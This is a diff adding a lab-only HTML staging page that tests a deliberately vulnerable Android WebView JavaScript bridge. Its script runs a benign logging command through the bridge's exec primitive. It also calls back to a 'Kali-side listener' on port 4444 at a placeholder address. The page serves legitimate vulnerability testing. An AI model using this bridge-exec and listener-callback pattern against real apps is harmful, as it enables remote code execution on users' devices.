@@ -1,0 +1,29 @@
+<!doctype html>
+<!--
+  P6 RIG EXAMPLE STAGING PAGE (lab only, policy §1/§7).
+  Benign marker body per policy §2 — no attack payload.
+  Placeholders: 192.0.2.10 is RFC 5737 example space; replace with YOUR lab
+  host when running the rig. Copy to payload.html (uncommitted) for runs.
+-->
+<html>
+<head><meta charset="utf-8"><title>p6rig demo</title></head>
+<body>
+  <h1>P6 rig demo page</h1>
+  <p>Expected markers in <code>adb logcat -s P6RIG</code>:
+     BRIDGE_REACHED, BRIDGE_EXEC, BRIDGE_CALLBACK.</p>
+  <script>
+    // E stage (C1): page JS reaching app-process code through the
+    // deliberately vulnerable addJavascriptInterface bridge.
+    if (window.Android && window.Android.mark) {
+      window.Android.mark("stage-e-bridge-reached");
+      // benign command marker — proves the Runtime.exec primitive of the class
+      window.Android.runCommand("log -p i -t P6RIGQR stage_e_exec_ok");
+      // C stage: session-verification callback to the Kali-side listener stub
+      window.Android.callback("192.0.2.10", 4444);
+    } else {
+      // Opened in a non-vulnerable surface (e.g. plain browser) — the control arm.
+      console.log("P6RIG control arm: no window.Android bridge");
+    }
+  </script>
+</body>
+</html>
